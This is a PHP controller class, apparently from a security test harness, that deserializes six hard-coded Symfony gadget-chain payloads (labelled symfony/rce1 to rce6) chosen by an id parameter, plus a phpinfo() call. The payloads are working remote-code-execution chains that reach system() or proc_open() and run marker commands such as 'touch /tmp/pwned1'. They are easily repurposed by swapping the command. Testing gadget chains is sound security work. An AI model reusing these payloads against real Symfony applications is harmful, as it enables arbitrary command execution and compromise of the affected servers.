<?php
class DeserializationController extends Controller
{
    public function __construct()
    {
        $privileged = True;
        parent::__construct($privileged);
    }

    public function run($router, $params)
    {
        $id = $params[0] ?? '';

        if ($id == 1){
            // symfony/rce1
            unserialize("O:43:\"Symfony\Component\Cache\Adapter\ApcuAdapter\":3:{s:64:\"�Symfony\Component\Cache\Adapter\AbstractAdapter�mergeByLifetime\";s:9:\"proc_open\";s:58:\"�Symfony\Component\Cache\Adapter\AbstractAdapter�namespace\";a:0:{}s:57:\"�Symfony\Component\Cache\Adapter\AbstractAdapter�deferred\";s:17:\"touch /tmp/pwned1\";}");
        }
        else if($id == 2){
            // symfony/rce2
            unserialize("O:38:\"Symfony\Component\Process\ProcessPipes\":1:{s:45:\"�Symfony\Component\Process\ProcessPipes�files\";a:1:{i:0;O:46:\"Symfony\Component\Finder\Expression\Expression\":1:{s:53:\"�Symfony\Component\Finder\Expression\Expression�value\";O:38:\"Symfony\Component\Templating\PhpEngine\":4:{s:9:\"�*�parser\";O:47:\"Symfony\Component\Templating\TemplateNameParser\":0:{}s:8:\"�*�cache\";a:1:{s:0:\"\";O:50:\"Symfony\Component\Templating\Storage\StringStorage\":1:{s:11:\"�*�template\";s:44:\"<?php system('touch /tmp/pwned2');;die(); ?>\";}}s:10:\"�*�current\";O:46:\"Symfony\Component\Templating\TemplateReference\":0:{}s:10:\"�*�globals\";a:0:{}}}}}");
        }
        else if($id == 3){
            // symfony/rce3
            unserialize("O:44:\"Symfony\Component\Process\Pipes\WindowsPipes\":1:{s:51:\"�Symfony\Component\Process\Pipes\WindowsPipes�files\";a:1:{i:0;O:46:\"Symfony\Component\Finder\Expression\Expression\":1:{s:53:\"�Symfony\Component\Finder\Expression\Expression�value\";O:38:\"Symfony\Component\Templating\PhpEngine\":4:{s:9:\"�*�parser\";O:47:\"Symfony\Component\Templating\TemplateNameParser\":0:{}s:8:\"�*�cache\";a:1:{s:0:\"\";O:50:\"Symfony\Component\Templating\Storage\StringStorage\":1:{s:11:\"�*�template\";s:44:\"<?php system('touch /tmp/pwned3');;die(); ?>\";}}s:10:\"�*�current\";O:46:\"Symfony\Component\Templating\TemplateReference\":0:{}s:10:\"�*�globals\";a:0:{}}}}}");
        }
        else if($id == 4){
            // symfony/rce4
            unserialize("O:47:\"Symfony\Component\Cache\Adapter\TagAwareAdapter\":2:{s:57:\"�Symfony\Component\Cache\Adapter\TagAwareAdapter�deferred\";a:1:{i:0;O:33:\"Symfony\Component\Cache\CacheItem\":2:{s:11:\"�*�poolHash\";i:1;s:12:\"�*�innerItem\";s:17:\"touch /tmp/pwned4\";}}s:53:\"�Symfony\Component\Cache\Adapter\TagAwareAdapter�pool\";O:44:\"Symfony\Component\Cache\Adapter\ProxyAdapter\":2:{s:54:\"�Symfony\Component\Cache\Adapter\ProxyAdapter�poolHash\";i:1;s:58:\"�Symfony\Component\Cache\Adapter\ProxyAdapter�setInnerItem\";s:6:\"system\";}}");
        }
        else if($id == 5){
            // symfony/rce5
            unserialize("O:60:\"Symfony\Component\HttpKernel\DataCollector\DumpDataCollector\":7:{s:7:\"�*�data\";a:3:{i:0;a:4:{s:4:\"data\";s:1:\"1\";s:4:\"name\";O:40:\"Symfony\Component\Form\FormErrorIterator\":2:{s:4:\"form\";N;s:48:\"�Symfony\Component\Form\FormErrorIterator�errors\";a:1:{i:0;O:40:\"Symfony\Component\Form\FormErrorIterator\":2:{s:4:\"form\";O:41:\"Symfony\Component\Cache\Traits\RedisProxy\":2:{s:48:\"�Symfony\Component\Cache\Traits\RedisProxy�redis\";s:17:\"touch /tmp/pwned5\";s:54:\"�Symfony\Component\Cache\Traits\RedisProxy�initializer\";O:39:\"Symfony\Component\Console\Helper\Dumper\":1:{s:48:\"�Symfony\Component\Console\Helper\Dumper�handler\";a:2:{i:0;O:44:\"Symfony\Component\Cache\Adapter\ProxyAdapter\":3:{s:61:\"�Symfony\Component\Cache\Adapter\ProxyAdapter�createCacheItem\";s:2:\"dd\";s:55:\"�Symfony\Component\Cache\Adapter\ProxyAdapter�namespace\";s:0:\"\";s:50:\"�Symfony\Component\Cache\Adapter\ProxyAdapter�pool\";O:43:\"Symfony\Component\Cache\Adapter\NullAdapter\":1:{s:60:\"�Symfony\Component\Cache\Adapter\NullAdapter�createCacheItem\";s:6:\"system\";}}i:1;s:7:\"getItem\";}}}s:48:\"�Symfony\Component\Form\FormErrorIterator�errors\";a:0:{}}}}s:4:\"file\";s:1:\"3\";s:4:\"line\";s:1:\"4\";}i:1;N;i:2;N;}s:71:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�stopwatch\";N;s:76:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�fileLinkFormat\";N;s:71:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�dataCount\";i:0;s:73:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�isCollected\";b:0;s:73:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�clonesCount\";i:0;s:73:\"�Symfony\Component\HttpKernel\DataCollector\DumpDataCollector�clonesIndex\";i:0;}");
        }
        else if($id == 6){
            // symfony/rce6
            unserialize("O:64:\"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator\":1:{s:72:\"�Symfony\Component\Routing\Loader\Configurator\ImportConfigurator�parent\";O:41:\"Symfony\Component\Cache\Traits\RedisProxy\":2:{s:54:\"�Symfony\Component\Cache\Traits\RedisProxy�initializer\";O:80:\"Symfony\Component\DependencyInjection\Loader\Configurator\InstanceofConfigurator\":1:{s:9:\"�*�parent\";O:40:\"Symfony\Component\Cache\Simple\Psr6Cache\":1:{s:46:\"�Symfony\Component\Cache\Simple\Psr6Cache�pool\";O:47:\"Symfony\Component\Cache\Adapter\PhpArrayAdapter\":2:{s:55:\"�Symfony\Component\Cache\Adapter\PhpArrayAdapter�values\";a:1:{s:17:\"touch /tmp/pwned6\";a:0:{}}s:64:\"�Symfony\Component\Cache\Adapter\PhpArrayAdapter�createCacheItem\";s:9:\"proc_open\";}}}s:48:\"�Symfony\Component\Cache\Traits\RedisProxy�redis\";s:17:\"touch /tmp/pwned6\";}}");
        }
        else if($id == 999){
            phpinfo();
        }
        else{
            $router->jsonify(['message' => 'Payload does not exist', 'status' => 'danger'], 400);
            exit;
        }
    }
}